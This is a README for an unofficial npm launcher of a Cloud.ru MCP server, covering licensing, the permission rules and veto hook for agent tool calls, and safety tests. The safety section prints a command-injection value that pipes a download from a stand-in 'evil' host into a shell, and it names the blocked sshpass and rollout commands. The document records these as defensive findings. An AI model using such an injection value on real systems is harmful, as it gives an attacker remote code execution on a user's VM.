# @dzhechkov/cloudru-hub

> **STATUS: published — the ADR-001 licence hold is SATISFIED (AM-2, 2026-08-12).**
> [Тимур](https://shkrbkv.ru/about/), the author of the Hermes engine additions, approved publication (owner-reported
> 2026-08-12 — the grant record is linked from the `Grant-Confirmation:` line in LICENSE
> Part 2; archiving the author's written confirmation is a recorded owner follow-up).
> The `dz guard` `licence-hold` rule stays armed and keeps verifying
> LICENSE/THIRD_PARTY_NOTICES/SPDX on every publish — a satisfied hold passes with the
> trigger in place.

> **Unofficial. NOT affiliated with, endorsed, or supported by Cloud.ru.** "Cloud.ru" is a
> trademark of its owner; this launcher merely talks to the public Cloud.ru Evolution API
> through the `cloudru-vm` engine.

Thin JS launcher for the **`cloudru-vm` MCP engine** — a Go MCP server with **144 tools**
(MEASURED — live `tools/list` probe, `data/tools-list-snapshot.json`) for Cloud.ru
Evolution: VMs, k8s, PostgreSQL/Kafka/Redis, DNS, S3, certificates, billing/FinOps, and a
docker-compose deploy wizard.

## Attribution

- **CLI foundation and everything in this package** (launcher, adapters, installer,
  tests): **Dmitry Zhechkov** (MIT — LICENSE Part 1). Per ADR-001 AM-1 the original Go
  CLI on which the engine builds is the owner's work; the Hermes engine is a derivative
  of it.
- **Hermes engine additions** (the ~144-tool MCP layer): **[Тимур](https://shkrbkv.ru/about/)**, the Hermes author.
  **Zero bytes of those additions ship in this package** — no binary, no Go sources, no
  skill corpus. Publication of this package was approved by the author (grant recorded
  2026-08-12 — LICENSE Part 2, `Grant-Confirmation:` link). The author designated no
  licence text for the engine additions themselves; nothing here grants third parties
  rights to them.

## What ships here (our code only — ADR-002)

| Piece | Where | What it does |
|---|---|---|
| Launcher | `bin/cloudru-hub.js` | resolves the engine binary at **runtime** (never bundled): `$CLOUDRU_VM_BIN` → `~/.cloudru-hub/config.json` `enginePath` → optional platform package `@dzhechkov/cloudru-vm-linux-x64` (exists only post-grant); verifies sha256 against the pin in `package.json.cloudruHub.binaryHashes` |
| Paid-step brake (ADR-004) | `src/install.js`, `templates/.claude/hooks/` | emits `permissions` **ask** rules for every mutating-or-shell-reaching tool (65 tools — MEASURED, `data/tools-classification.json` counts), **deny** for `secret_value`/`cert_private_key`, **allow** for 77 behaviour-audited read-only tools, in BOTH `mcp__cloudru-vm__`/`mcp__cloudru_vm__` spellings (prefix normalization not yet live-probed), plus a PreToolUse veto hook (ssh-guard + the kubectl `rollout` hole) — and **executes** the veto probe before declaring install success |
| Target tiering (ADR-005) | `src/install.js` | claude-code = full install; codex = plan-only (delivery requires an executed veto probe); openclaude/opencode/cursor/windsurf/copilot = **refused** (DEGRADED until live probe); agents-md/gemini = pointer-only ≤2048 chars with a mandatory no-veto warning |
| Skill dialect compiler (ADR-006) | `src/dialects.js`, `data/dialects.json` | generates per-target variants of the canonical skill tree (which is NOT shipped — point `--canonical` at an engine distribution); hard-fails if any Hermes-dialect token survives AND if the engine codename survives in any case in any emitted file (positive invariant, not just the enumerated denylist); unlinks dangling links; enforces the 12 000-char router cap on lossy layouts; byte-deterministic |
| Golden classification | `data/tools-classification.json` | every engine tool → allow/ask/deny; `allow` requires a BEHAVIOUR audit of the tool's engine handler (read-only proven at the pinned baseline, engine file:line cited per entry — schema shape alone is never sufficient: the `confirmed`-prop heuristic mis-filed `stack_status`, which advances jobs and invokes paid create tools); a live tool unknown to it is a drift finding (deny-by-default) |

## Usage

```bash
cloudru-hub resolve                 # where is the engine, which sha256, is it the pinned baseline
cloudru-hub self-test               # resolve → sha256 → engine version → live tools/list → coverage
cloudru-hub mcp                     # run the engine as an MCP stdio server (what .mcp.json points at)
cloudru-hub install --target claude-code   # emit .mcp.json + permission brake + veto hook, PROBE the veto
cloudru-hub install --target agents-md     # pointer-only section (no tools, no fake support)
cloudru-hub compile-skill --canonical <engine>/skill/cloudru-hub --target claude-code --out ./skill-out
```

## Local testing (works now, no publish)

```bash
export CLOUDRU_VM_BIN=/path/to/engine-build/cloudru-vm   # e.g. the pinned 0.2.3-20260718 baseline
node bin/cloudru-hub.js self-test
```

Expected: 5 green steps ending `self-test: ALL GREEN` (resolution, sha256 match against
the pinned baseline `59f83fc0…c05124`, engine version, 144 live tools, full
classification coverage). Full walkthrough incl. `npm link` and MCP registration:
[`docs/LOCAL-TESTING.md`](docs/LOCAL-TESTING.md).

## Safety properties (all layer-1, discrimination-proven)

Every named property has a mutation-gate entry (`test/mutation-registry.json`, run
`dz mutation-gate --package packages/@dzhechkov/cloudru-hub`) that deletes the protection
and requires the suite to go RED — 13/13 PROVEN (MEASURED — gate run 2026-08-12):

1. **The licence gate stays armed post-grant** — the `licenseHold` trigger field
   deliberately STAYS in package.json, so the `dz guard` `licence-hold` HARD rule keeps
   verifying LICENSE (grant record + `Grant-Confirmation:` URL, no PENDING placeholder),
   THIRD_PARTY_NOTICES and the SPDX field on every publish; pack tests additionally pin
   the honest grant wording (owner-attested, no fabricated grant deed), the SPDX-matches-
   LICENSE invariant (ADR-001 Confirmation) and the publishable state.
2. **Zero upstream engine bytes** — explicit `files[]` whitelist + a test that walks the
   `npm pack --dry-run` file list rejecting ELF magic, `.go` sources and engine paths.
3. **The paid-step brake vetoes** — acid fixtures run the emitted hook (`sshpass` → exit 2,
   keyed ssh → 0, `rollout restart` → 2, `rollout status` → 0); the installer refuses to
   report success unless the executed probe blocks.
4. **`stack_status` stays ask** (ADR-004 AM-1) — it ADVANCES planned/running stack jobs
   server-side, invoking the paid create tools (`tools_stack.go:479` → `advance` →
   `s.callTool` `:220`; LIVE-REPRODUCED: one call moved a planned job to `running` and
   attempted `provision`). Flipping it back to allow re-opens the zero-prompt paid chain
   `stack_plan→stack_status` and goes RED.
5. **`logs` stays ask** (ADR-004 AM-2) — it concatenates its user-controlled `service`
   arg RAW into a remote `docker compose logs <service>` run over SSH (`tools.go:1758` →
   `engine/logs.go:61` `cmd += " " + opts.Service` → `Deployer.Exec` → `session.CombinedOutput`
   `internal/deploy/ssh.go:117`), so `service="app; curl evil | sh"` is arbitrary RCE on the
   user's VM. Flipping it back to allow puts that command-injection path behind a silent
   allow and goes RED. (Engine injection flagged to the author — the classifier can only
   prompt, it cannot escape the arg.)
6. **The dialect codename gate is armed** — emptying `forbiddenCodenames` (the positive
   case-insensitive, word-boundary net under the 8-token denylist) goes RED; the denylist
   alone let the bare codename survive 5× in the real-corpus compile (MEASURED). The gate
   covers the full engine identity — `hermes`, `dzhechko` (go-module owner), `cloudru-vm-cli`,
   `captainkeys` — with word-boundary matching so the published scope `@dzhechkov` is not
   over-blocked.
7. **The engine binary-name leak forms are scrubbed, not codename-gated** (since 0.1.3) — the
   bare token `cloudru-vm` is ALSO the legitimate MCP server name that must appear in
   output (`\bcloudru-vm\b` over-blocks the compiler's own injected prose `сервера
   cloudru-vm видны` — PROVEN), so instead the two unambiguous leak FORMS get targeted
   replacements in every target: dotted path `.cloudru-vm` → `.cloudru-hub`, and CLI
   invocation `cloudru-vm <verb>` → `cloudru-hub <verb>` for the engine's real cobra
   command set only (`deploy|status|logs|destroy|verify|init|version|list-zones|
   list-images|mcp|doctor`, cited from the baseline `cmd/cloudru-vm/main.go`). Disarming
   either scrub goes RED (`dialect-binary-path-leak-scrubbed`,
   `dialect-binary-invocation-leak-scrubbed`).

## Post-grant publish checklist (executed 2026-08-12)

1. ✅ Grant recorded (ADR-001 AM-2, exit 2): LICENSE Part 2 placeholder replaced with the
   owner-attested grant record + `Grant-Confirmation:` link, `"license": "MIT"` (owner
   code only), `private` removed, `licenseHold` trigger deliberately KEPT armed.
   Open owner follow-up: archive the author's written confirmation in the grant record.
2. ✅ `dz guard check --op publish` passes (the licence-hold rule verifies all of it).
3. ⏳ NOT YET: the platform package `@dzhechkov/cloudru-vm-linux-x64` (the binary-carrying
   channel) still requires the ADR-002 trusted-CI build (`-trimpath`, sha256 must equal
   `cloudruHub.binaryHashes['linux-x64']`) + the go-licenses reconciliation in
   THIRD_PARTY_NOTICES before ITS first publication. Until then the engine binary is
   supplied via `$CLOUDRU_VM_BIN` or `~/.cloudru-hub/config.json` (see *Local testing*).
4. ✅ Published via the repo's standard release flow.

## Tests

`npm test` — 70 tests, 70 passing (MEASURED — `node --test 'test/*.test.mjs'`, 2026-08-12;
node:test, zero deps). Suite includes the tarball-content gate,
the post-grant licence gates, the brake acid tests, installer tiering, and dialect
compilation.
